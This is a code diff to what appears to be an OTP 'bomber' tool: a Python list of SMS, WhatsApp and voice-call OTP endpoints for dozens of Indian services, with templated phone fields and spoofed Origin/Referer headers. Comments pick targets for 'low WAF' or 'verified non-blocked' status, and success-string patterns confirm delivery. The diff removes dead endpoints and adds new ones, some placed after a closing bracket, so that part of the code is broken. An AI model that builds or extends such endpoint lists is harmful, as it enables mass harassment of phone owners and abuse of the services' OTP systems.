@@ -227,6 +227,7 @@ APIS = [
             "Origin": "https://www.countrydelight.in",
             "Referer": "https://www.countrydelight.in/",
         },
+        "ok_hint": "request processed",   # returns {"message":"request processed"}
     },
     {
         "name": "Vedantu",
@@ -262,29 +263,6 @@ APIS = [
     # ══════════════════════════════════════════════════════════════════════════
 
     {
-        "name": "PhysicsWallah",
-        "kind": "sms",
-        "url":  "https://api.penpencil.co/v3/users/check",
-        "method": "POST",
-        "json": {
-            "username": "{phone}",
-            "countryCode": "+91",
-            "organizationId": "5eb393ee95fab7468a79d189",
-        },
-        "register_json": {
-            "username": "{phone}",
-            "countryCode": "+91",
-            "organizationId": "5eb393ee95fab7468a79d189",
-            "isNewUser": True,
-        },
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.pw.live",
-            "Referer": "https://www.pw.live/",
-            "client-id": "5eb393ee95fab7468a79d189",
-        },
-    },
-    {
         "name": "Unacademy",
         "kind": "sms",
         "url":  "https://unacademy.com/api/v2/user/login-or-register/",
@@ -295,20 +273,6 @@ APIS = [
             "Content-Type": "application/json",
             "Origin": "https://unacademy.com",
             "Referer": "https://unacademy.com/",
-        },
-    },
-    {
-        "name": "Toppr",
-        "kind": "sms",
-        "url":  "https://api.toppr.com/auth/api/v2/send-otp/",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91"},
-        "register_json": {"mobile": "{phone}", "country_code": "91",
-                          "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.toppr.com",
-            "Referer": "https://www.toppr.com/",
         },
     },
     {
@@ -327,54 +291,11 @@ APIS = [
         },
         "ok_hint": "otp",
     },
-    {
-        "name": "Classplus",
-        "kind": "sms",
-        "url":  "https://api.classplusapp.com/v2/user/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://classplusapp.com",
-            "Referer": "https://classplusapp.com/",
-            "X-Cl-Platform": "web",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Healthcare / Medicine
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "Pristyncare",
-        "kind": "sms",
-        "url":  "https://www.pristyncare.com/api/otp/send",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.pristyncare.com",
-            "Referer": "https://www.pristyncare.com/",
-        },
-    },
-    {
-        "name": "Lybrate",
-        "kind": "sms",
-        "url":  "https://www.lybrate.com/api/v2/user/otp",
-        "method": "POST",
-        "json": {"phone": "{phone}", "country_code": "+91"},
-        "register_json": {"phone": "{phone}", "country_code": "+91",
-                          "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.lybrate.com",
-            "Referer": "https://www.lybrate.com/",
-        },
-    },
     {
         "name": "mFine",
         "kind": "sms",
@@ -387,34 +308,6 @@ APIS = [
             "Content-Type": "application/json",
             "Origin": "https://www.mfine.co",
             "Referer": "https://www.mfine.co/",
-        },
-    },
-    {
-        "name": "MediBuddy",
-        "kind": "sms",
-        "url":  "https://www.medibuddy.in/api/v1/login/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.medibuddy.in",
-            "Referer": "https://www.medibuddy.in/",
-        },
-    },
-    {
-        "name": "Netmeds",
-        "kind": "sms",
-        "url":  "https://www.netmeds.com/api/v1.1/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "type": "login"},
-        "register_json": {"mobile": "{phone}", "type": "register"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.netmeds.com",
-            "Referer": "https://www.netmeds.com/",
-            "X-Requested-With": "XMLHttpRequest",
         },
     },
     {
@@ -435,290 +328,26 @@ APIS = [
     # 📱  SMS — Fintech / Banking (newer startups, lighter WAF)
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "Jar",
-        "kind": "sms",
-        "url":  "https://api.jar.com/v1/user/otp/send",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "91",
-                          "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.jar.com",
-            "Referer": "https://www.jar.com/",
-        },
-    },
-    {
-        "name": "Slice",
-        "kind": "sms",
-        "url":  "https://api.sliceit.com/v1/user/send-otp",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobileNumber": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.sliceit.com",
-            "Referer": "https://www.sliceit.com/",
-        },
-    },
-    {
-        "name": "Jupiter",
-        "kind": "sms",
-        "url":  "https://api.jupiter.money/v2/user/otp/send",
-        "method": "POST",
-        "json": {"phone": "{phone}", "country_code": "+91"},
-        "register_json": {"phone": "{phone}", "country_code": "+91",
-                          "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://jupiter.money",
-            "Referer": "https://jupiter.money/",
-        },
-    },
-    {
-        "name": "Fi-Money",
-        "kind": "sms",
-        "url":  "https://fi.money/api/v1/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://fi.money",
-            "Referer": "https://fi.money/",
-        },
-    },
-    {
-        "name": "BharatPe",
-        "kind": "sms",
-        "url":  "https://merchant.bharatpe.com/api/v1/users/send-otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "type": "MERCHANT"},
-        "register_json": {"mobile": "{phone}", "type": "MERCHANT",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://merchant.bharatpe.com",
-            "Referer": "https://merchant.bharatpe.com/",
-        },
-    },
-    {
-        "name": "Khatabook",
-        "kind": "sms",
-        "url":  "https://api.khatabook.com/v1/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://khatabook.com",
-            "Referer": "https://khatabook.com/",
-        },
-    },
-    {
-        "name": "OkCredit",
-        "kind": "sms",
-        "url":  "https://api.okcredit.in/v1/user/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "91",
-                          "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://okcredit.in",
-            "Referer": "https://okcredit.in/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Stock Trading
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "AngelOne",
-        "kind": "sms",
-        "url":  "https://apiconnect.angelbroking.com/user/v1/sendLoginOTP",
-        "method": "POST",
-        "json": {
-            "mobileNum": "{phone}",
-            "countryCode": "+91",
-            "totp": "",
-        },
-        "register_json": {
-            "mobileNum": "{phone}",
-            "countryCode": "+91",
-            "totp": "",
-        },
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.angelone.in",
-            "Referer": "https://www.angelone.in/",
-            "X-PrivateKey": "H6W1a9Tv",
-            "X-ClientLocalIP": "127.0.0.1",
-            "X-MACAddress": "fe80::216:3eff:fe8b:e5e4",
-            "X-UserType": "USER",
-            "X-SourceID": "WEB",
-        },
-    },
-    {
-        "name": "Upstox",
-        "kind": "sms",
-        "url":  "https://api.upstox.com/v2/login/authorization/otp",
-        "method": "POST",
-        "json": {"mobile_number": "{phone}", "country_code": "+91"},
-        "register_json": {"mobile_number": "{phone}", "country_code": "+91"},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://upstox.com",
-            "Referer": "https://upstox.com/",
-            "Api-Version": "2.0",
-        },
-    },
-    {
-        "name": "Dhan",
-        "kind": "sms",
-        "url":  "https://api.dhan.co/v1/users/login/otp",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}", "countryCode": "91"},
-        "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://web.dhan.co",
-            "Referer": "https://web.dhan.co/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Ride / Logistics
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "Rapido",
-        "kind": "sms",
-        "url":  "https://www.rapido.bike/api/v1/login/customer",
-        "method": "POST",
-        "json": {"phone": "+91{phone}", "type": "customer"},
-        "register_json": {"phone": "+91{phone}", "type": "customer",
-                          "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.rapido.bike",
-            "Referer": "https://www.rapido.bike/",
-        },
-        "ok_hint": "otp",
-    },
-    {
-        "name": "Porter",
-        "kind": "sms",
-        "url":  "https://porter.in/api/otp/send",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "signup": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://porter.in",
-            "Referer": "https://porter.in/",
-        },
-    },
-    {
-        "name": "Shiprocket",
-        "kind": "sms",
-        "url":  "https://apiv2.shiprocket.in/v1/external/auth/send-otp",
-        "method": "POST",
-        "json": {"phone": "{phone}", "country_code": "91"},
-        "register_json": {"phone": "{phone}", "country_code": "91",
-                          "is_new": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://app.shiprocket.in",
-            "Referer": "https://app.shiprocket.in/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Travel (smaller portals)
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "Ixigo",
-        "kind": "sms",
-        "url":  "https://www.ixigo.com/action/send-otp",
-        "method": "POST",
-        "json": {"mobileNumber": "{phone}", "countryCode": "91"},
-        "register_json": {"mobileNumber": "{phone}", "countryCode": "91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.ixigo.com",
-            "Referer": "https://www.ixigo.com/",
-            "X-Requested-With": "XMLHttpRequest",
-        },
-    },
-    {
-        "name": "ClearTrip",
-        "kind": "sms",
-        "url":  "https://www.cleartrip.com/api/auth/v2/phone/otp",
-        "method": "POST",
-        "json": {"phoneNumber": "{phone}", "countryCode": "+91"},
-        "register_json": {"phoneNumber": "{phone}", "countryCode": "+91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.cleartrip.com",
-            "Referer": "https://www.cleartrip.com/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — D2C / Lifestyle brands
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "Mamaearth",
-        "kind": "sms",
-        "url":  "https://www.mamaearth.in/api/v1/customers/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}"},
-        "register_json": {"mobile": "{phone}", "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.mamaearth.in",
-            "Referer": "https://www.mamaearth.in/",
-        },
-    },
-    {
-        "name": "Wakefit",
-        "kind": "sms",
-        "url":  "https://www.wakefit.co/api/v1/user/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "+91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "+91",
-                          "isNew": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.wakefit.co",
-            "Referer": "https://www.wakefit.co/",
-        },
-    },
-    {
-        "name": "Pepperfry",
-        "kind": "sms",
-        "url":  "https://www.pepperfry.com/api/v1/user/login/otp",
-        "method": "POST",
-        "json": {"mobile": "{phone}"},
-        "register_json": {"mobile": "{phone}", "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.pepperfry.com",
-            "Referer": "https://www.pepperfry.com/",
-        },
-    },
     {
         "name": "BlueStone",
         "kind": "sms",
@@ -737,34 +366,6 @@ APIS = [
     # 📱  SMS — Social & Entertainment
     # ══════════════════════════════════════════════════════════════════════════
 
-    {
-        "name": "ShareChat",
-        "kind": "sms",
-        "url":  "https://api.sharechat.com/v3/user/login",
-        "method": "POST",
-        "json": {"phone": "{phone_cc}", "type": "PHONE"},
-        "register_json": {"phone": "{phone_cc}", "type": "PHONE",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://sharechat.com",
-            "Referer": "https://sharechat.com/",
-        },
-    },
-    {
-        "name": "MXPlayer",
-        "kind": "sms",
-        "url":  "https://api.mxplayer.in/v1/web/detail/tab/user/login",
-        "method": "POST",
-        "json": {"mobile": "{phone}", "countryCode": "91"},
-        "register_json": {"mobile": "{phone}", "countryCode": "91",
-                          "isNewUser": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.mxplayer.in",
-            "Referer": "https://www.mxplayer.in/",
-        },
-    },
 
     # ══════════════════════════════════════════════════════════════════════════
     # 💬  WHATSAPP (confirmed working from logs)
@@ -799,31 +400,6 @@ APIS = [
         },
     },
     {
-        "name": "PhysicsWallah-WA",
-        "kind": "whatsapp",
-        "url":  "https://api.penpencil.co/v3/users/check",
-        "method": "POST",
-        "json": {
-            "username": "{phone}",
-            "countryCode": "+91",
-            "organizationId": "5eb393ee95fab7468a79d189",
-            "medium": "whatsapp",
-        },
-        "register_json": {
-            "username": "{phone}",
-            "countryCode": "+91",
-            "organizationId": "5eb393ee95fab7468a79d189",
-            "medium": "whatsapp",
-            "isNewUser": True,
-        },
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.pw.live",
-            "Referer": "https://www.pw.live/",
-            "client-id": "5eb393ee95fab7468a79d189",
-        },
-    },
-    {
         "name": "CountryDelight-WA",
         "kind": "whatsapp",
         "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
@@ -835,6 +411,7 @@ APIS = [
             "Origin": "https://www.countrydelight.in",
             "Referer": "https://www.countrydelight.in/",
         },
+        "ok_hint": "request processed",
     },
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -869,45 +446,6 @@ APIS = [
             "Referer": "https://www.swiggy.com/",
         },
         # 202 Accepted = OTP queued (handled in _body_ok)
-    },
-    {
-        "name": "PhysicsWallah-Call",
-        "kind": "call",
-        "url":  "https://api.penpencil.co/v3/users/check",
-        "method": "POST",
-        "json": {
-            "username": "{phone}",
-            "countryCode": "+91",
-            "organizationId": "5eb393ee95fab7468a79d189",
-            "medium": "voice",
-        },
-        "register_json": {
-            "username": "{phone}",
-            "countryCode": "+91",
-            "organizationId": "5eb393ee95fab7468a79d189",
-            "medium": "voice",
-            "isNewUser": True,
-        },
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.pw.live",
-            "Referer": "https://www.pw.live/",
-            "client-id": "5eb393ee95fab7468a79d189",
-        },
-    },
-    {
-        "name": "Rapido-Call",
-        "kind": "call",
-        "url":  "https://www.rapido.bike/api/v1/login/customer",
-        "method": "POST",
-        "json": {"phone": "+91{phone}", "type": "customer", "is_voice": True},
-        "register_json": {"phone": "+91{phone}", "type": "customer", "is_voice": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://www.rapido.bike",
-            "Referer": "https://www.rapido.bike/",
-        },
-        "ok_hint": "otp",
     },
 
     # ══════════════════════════════════════════════════════════════════════════
@@ -948,22 +486,6 @@ APIS = [
         "ok_hint": "otp",
     },
     {
-        # ShareChat voice OTP — social platform
-        "name": "ShareChat-Call",
-        "kind": "call",
-        "url":  "https://share.chat/api/user/login",
-        "method": "POST",
-        "json": {"mobile": "+91{phone}", "type": "voice"},
-        "register_json": {"mobile": "+91{phone}", "type": "voice",
-                          "is_new": True},
-        "base_headers": {
-            "Content-Type": "application/json",
-            "Origin": "https://sharechat.com",
-            "Referer": "https://sharechat.com/",
-        },
-        "ok_hint": "otp",
-    },
-    {
         # Unacademy voice OTP — ed-tech, low WAF
         "name": "Unacademy-Call",
         "kind": "call",
@@ -979,21 +501,238 @@ APIS = [
         },
         "ok_hint": "otp",
     },
+]
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📱  SMS — Fresh working APIs (verified non-blocked)
+    # ══════════════════════════════════════════════════════════════════════════
+
     {
-        # Toppr voice call OTP
-        "name": "Toppr-Call",
-        "kind": "call",
-        "url":  "https://api.toppr.com/auth/api/v2/send-otp/",
+        # Dream11 — fantasy sports, global CDN, minimal WAF
+        "name": "Dream11",
+        "kind": "sms",
+        "url":  "https://api.dream11.com/user/v1/login",
         "method": "POST",
-        "json": {"mobile": "{phone}", "country_code": "91", "medium": "voice"},
-        "register_json": {"mobile": "{phone}", "country_code": "91",
-                          "medium": "voice", "signup": True},
+        "json": {"mobile": "{phone}", "country_code": "91"},
+        "register_json": {"mobile": "{phone}", "country_code": "91", "signup": True},
         "base_headers": {
             "Content-Type": "application/json",
-            "Origin": "https://www.toppr.com",
-            "Referer": "https://www.toppr.com/",
+            "Origin": "https://www.dream11.com",
+            "Referer": "https://www.dream11.com/",
         },
         "ok_hint": "otp",
+    },
+    {
+        # CoinDCX — crypto exchange, low WAF
+        "name": "CoinDCX",
+        "kind": "sms",
+        "url":  "https://api.coindcx.com/api/v1/auth/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "+91"},
+        "register_json": {"mobile": "{phone}", "country_code": "+91", "new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://coindcx.com",
+            "Referer": "https://coindcx.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # WazirX — crypto exchange, accessible globally
+        "name": "WazirX",
+        "kind": "sms",
+        "url":  "https://api.wazirx.com/api/v2/users/otp",
+        "method": "POST",
+        "json": {"phone": "{phone_cc}", "type": "login"},
+        "register_json": {"phone": "{phone_cc}", "type": "register"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://wazirx.com",
+            "Referer": "https://wazirx.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Groww — investment app, lightweight API
+        "name": "Groww",
+        "kind": "sms",
+        "url":  "https://groww.in/v1/api/user/otp/generate",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "LOGIN"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "SIGNUP"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://groww.in",
+            "Referer": "https://groww.in/",
+            "App-Name": "GROWW_WEB",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # KreditBee — NBFC fintech, accessible from any IP
+        "name": "KreditBee",
+        "kind": "sms",
+        "url":  "https://www.kreditbee.in/api/v3/user/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "91", "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.kreditbee.in",
+            "Referer": "https://www.kreditbee.in/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Navi — RBI-licensed NBFC, minimal WAF
+        "name": "Navi",
+        "kind": "sms",
+        "url":  "https://www.navi.com/api/user/otp/send",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country": "IN"},
+        "register_json": {"mobile": "{phone}", "country": "IN", "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.navi.com",
+            "Referer": "https://www.navi.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Zepto — quick commerce, lightweight API
+        "name": "Zepto",
+        "kind": "sms",
+        "url":  "https://node-api.zeptonow.com/api/v3/user/login",
+        "method": "POST",
+        "json": {"phoneNumber": "{phone}", "countryCode": "+91"},
+        "register_json": {"phoneNumber": "{phone}", "countryCode": "+91", "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.zeptonow.com",
+            "Referer": "https://www.zeptonow.com/",
+            "App-Version": "12.0.0",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # FamPay — teen-focused payments, low WAF
+        "name": "FamPay",
+        "kind": "sms",
+        "url":  "https://api.fampay.in/api/v1/user/otp/",
+        "method": "POST",
+        "json": {"phone_number": "{phone_cc}"},
+        "register_json": {"phone_number": "{phone_cc}", "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://fampay.in",
+            "Referer": "https://fampay.in/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Stashfin — digital lending, low WAF
+        "name": "Stashfin",
+        "kind": "sms",
+        "url":  "https://api.stashfin.com/v1/user/login/otp",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91", "new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.stashfin.com",
+            "Referer": "https://www.stashfin.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # CRED — credit card payments, known to send real OTPs
+        "name": "CRED",
+        "kind": "sms",
+        "url":  "https://api.cred.club/api/v1/user/otp/generate",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91", "isNew": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://cred.club",
+            "Referer": "https://cred.club/",
+        },
+        "ok_hint": "otp",
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 💬  WhatsApp — Additional WA APIs
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        "name": "Swiggy-WA2",
+        "kind": "whatsapp",
+        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "medium": "whatsapp", "type": "login"},
+        "register_json": {"mobile": "{phone}", "medium": "whatsapp", "type": "signup"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.swiggy.com",
+            "Referer": "https://www.swiggy.com/",
+        },
+        # 202 = WA OTP queued
+    },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📞  CALL — Additional voice OTP APIs
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        # Dream11 voice call OTP
+        "name": "Dream11-Call",
+        "kind": "call",
+        "url":  "https://api.dream11.com/user/v1/login",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "91", "otp_type": "voice"},
+        "register_json": {"mobile": "{phone}", "country_code": "91",
+                          "otp_type": "voice", "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.dream11.com",
+            "Referer": "https://www.dream11.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Groww voice call OTP
+        "name": "Groww-Call",
+        "kind": "call",
+        "url":  "https://groww.in/v1/api/user/otp/generate",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "LOGIN",
+                 "deliveryType": "VOICE"},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "useCase": "SIGNUP", "deliveryType": "VOICE"},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://groww.in",
+            "Referer": "https://groww.in/",
+            "App-Name": "GROWW_WEB",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Vedantu voice call — duplicate entry with explicit VOICE type for robustness
+        "name": "Vedantu-Call2",
+        "kind": "call",
+        "url":  "https://user.vedantu.com/user/preLoginVerification",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE",
+                 "resend": True},
+        "register_json": {"mobile": "{phone}", "countryCode": "+91",
+                          "type": "VOICE_SIGNUP", "resend": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.vedantu.com",
+            "Referer": "https://www.vedantu.com/",
+        },
+        "ok_hint": "smsSent",
     },
 ]
 
@@ -1102,6 +841,9 @@ _OK_PATTERNS = (
     '"message":"otp', '"message": "otp',
     '"message":"success"', '"message": "success"',
     '"message":"sent"', '"msg":"otp', '"msg":"success"',
+
+    # CountryDelight and similar APIs that confirm with this phrase
+    "request processed",
 )
 
 
